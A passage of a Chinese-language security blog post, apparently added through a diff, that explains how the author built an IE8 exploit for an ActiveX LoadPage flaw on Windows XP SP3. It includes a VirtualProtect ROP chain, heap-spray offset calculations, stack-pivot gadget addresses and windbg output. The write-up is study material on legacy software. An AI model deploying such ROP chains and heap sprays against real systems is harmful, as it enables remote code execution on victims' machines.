+= "\x2d\x30\x3b\x63";	//xchg eax,esp;ret</span></div><div class="line"><span class="undefined">var arg2=1</span></div><div class="line"><span class="undefined">var arg3=1</span></div><div class="line"><span class="undefined">var arg4=1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.LoadPage(arg1,arg2,arg3,arg4);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>参考文章那篇对WinXpSp3+IE8写的很详细了，我这里就稍微写一下。</p>
+<p>1、通过mona插件获取<code>VirtualProtect</code>的ROP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona rop -m msvcrt.dll</div></pre></td></tr></table></figure>
+<p>在<code>Immunity debugger</code>目录下的<code>rop_chains.txt</code>文件就可以查看，不过这里获取的ROP链有些问题：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">rop_gadgets = unescape(</div><div class="line">  "%ue146%u77be" + // 0x77bee146 : ,# POP EBP # RETN [msvcrt.dll] </div><div class="line">  "%ue146%u77be" + // 0x77bee146 : ,# skip 4 bytes [msvcrt.dll]</div><div class="line">  "%u771a%u77c1" + // 0x77c1771a : ,# POP EBX # RETN [msvcrt.dll] </div><div class="line">  "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-&gt; ebx</div><div class="line">  "%ue185%u77c1" + // 0x77c1e185 : ,# POP EDX # RETN [msvcrt.dll] </div><div class="line">  "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-&gt; edx</div><div class="line">  "%uc5a3%u77bf" + // 0x77bfc5a3 : ,# POP ECX # RETN [msvcrt.dll] </div><div class="line">  "%u001f%u77c3" + // 0x77c3001f : ,# &amp;Writable location [msvcrt.dll]</div><div class="line">  "%u610d%u77c1" + // 0x77c1610d : ,# POP EDI # RETN [msvcrt.dll] </div><div class="line">  "%u6101%u77c1" + // 0x77c16101 : ,# RETN (ROP NOP) [msvcrt.dll]</div><div class="line">  "%u4d9a%u77c0" + // 0x77c04d9a : ,# POP ESI # RETN [msvcrt.dll] </div><div class="line">  "%uaacc%u77bf" + // 0x77bfaacc : ,# JMP [EAX] [msvcrt.dll]</div><div class="line">  "%uded4%u77c1" + // 0x77c1ded4 : ,# POP EAX # RETN [msvcrt.dll] </div><div class="line">  "%u1120%u77be" + // 0x77be1120 : ,# ptr to &amp;VirtualProtect() [IAT msvcrt.dll]</div><div class="line">  "%u67f0%u77c2" + // 0x77c267f0 : ,# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll] </div><div class="line">  "%u1025%u77c2" + // 0x77c21025 : ,# ptr to 'push esp # ret ' [msvcrt.dll]</div><div class="line">  ""); //  :</div></pre></td></tr></table></figure>
+<p>通过倒数第四个、第三个gadget中，已经成功使eax的值指向<code>VirtualProtect</code>地址，但下一个gadget却又将寄存器AL的值加上了0xEF，所以需要对倒数第三个gadget进行修改，改成：<code>0x77be1120-0xEF+256=0x77be1131</code>。</p>
+<p>2、分配堆之后，在windbg中查看堆分配的统计数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:019&gt; !heap -stat -h 150000</div><div class="line"> heap @ 00150000</div><div class="line">group-by: TOTSIZE max-display: 20</div><div class="line">    size     #blocks     total     ( %) (percent of total busy bytes)</div><div class="line">    7ffc0 190 - c7f9c00  (98.24)</div><div class="line">    3fff8 3 - bffe8  (0.37)</div><div class="line">    1fff8 6 - bffd0  (0.37)</div><div class="line">    80010 1 - 80010  (0.25)</div><div class="line">    fff8 6 - 5ffd0  (0.18)</div><div class="line">	......</div></pre></td></tr></table></figure>
+<p>可以看到分配了190个大小为7ffc0的堆，查看这些堆信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:019&gt; !heap -flt s 7ffc0</div><div class="line">    _HEAP @ 150000</div><div class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</div><div class="line">        0be60018 fff8 0000  [0b]   0be60020    7ffc0 - (busy VirtualAlloc)</div><div class="line">        0bef0018 fff8 fff8  [0b]   0bef0020    7ffc0 - (busy VirtualAlloc)</div><div class="line">        0bf80018 fff8 fff8  [0b]   0bf80020    7ffc0 - (busy VirtualAlloc)</div><div class="line">		......</div><div class="line">	   	......</div><div class="line">        1a020018 fff8 fff8  [0b]   1a020020    7ffc0 - (busy VirtualAlloc)</div><div class="line">        1a0b0018 fff8 fff8  [0b]   1a0b0020    7ffc0 - (busy VirtualAlloc)</div></pre></td></tr></table></figure>
+<p>这些堆的起始地址后四位都是0018，数据区都是从0020开始，因此如果0x0c0c0c0c为ROP的起始地址，需要填充的NOP数为<code>(0x0C0C0C0C - 0xXXXX0020)/2%0x1000 = 0x5f6</code>。</p>
+<p>针对exp中<code>end.substring(2,end.length-0x21)</code>有点不太理解，据说是前辈们的经验所得。从下标2开始，应该和BSTR字符串的内存空间占用情况有关系，BSTR字符串有四字节的header，所以0xXXXX0020开始的四字节为BSTR字符串的头部。0x21中的0x1应该是指BSTR的两字节结束符，之所以为什么还要减去0x20就不是很懂了。经过测试发现，减不减去0x21都不影响exp的正常执行。</p>
+<p>3、查找<code>pop eax;ret</code>跳板：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona find -s &quot;\x58\xC3&quot;</div></pre></td></tr></table></figure>
+<p>查找<code>xchg eax,esp;ret</code>跳板：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona find -s &quot;\x94\xC3&quot;</div></pre></td></tr></table></figure>
+<p>应注意选取的跳板地址里每一字节的值不能超过0x7f，这里选取的两个跳板地址为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x6338711b : &quot;\x58\xC3&quot;	pop eax;ret</div><div class="line">0x633b302d : &quot;\x94\xC3&quot;	xchg eax,esp;ret</div></pre></td></tr></table></figure>
+<p>4、函数<code>sub_10013DC0</code>的return指令为<code>retn 8</code>，会把栈抬高8字节，所以exp中<code>pop eax;ret</code>和<code>xchg eax,esp;ret</code>两个指令地址中间除了4字节的<code>\x0c\x0c\x0c\x0c</code>，又多填充了8字节。</p>
+<p>5、参考文章中分配了200个大堆块，我测试的时候200个堆块不足以达到0x0c0c0c0c地址处，因此改成了400个。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
+          
+            <a href="/tags/Exploitation/" rel="tag"># Exploitation</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/21/CommuniCrypt-Mail-1-16/" rel="next" title="CommuniCrypt Mail 1.16 - AOSMTP ActiveX Stack Buffer Overflow">
+                <i class="fa fa-chevron-left"></i> CommuniCrypt Mail 1.16 - AOSMTP ActiveX Stack Buffer Overflow
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="John Doe" />
+          <p class="site-author-name" itemprop="name">John Doe</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-分析"><span class="nav-number">1.</span> <span class="nav-text">0x01 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞成因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-exp编写"><span class="nav-number">2.</span> <span class="nav-text">0x02 exp编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IE6-IE7"><span class="nav-number">2.1.</span> <span class="nav-text">IE6/IE7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IE8"><span class="nav-number">2.2.</span> <span class="nav-text">IE8</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">
+    由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  </div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">
+    主题 &mdash;
+    <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+      NexT.Pisces
+    </a>
+  </div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
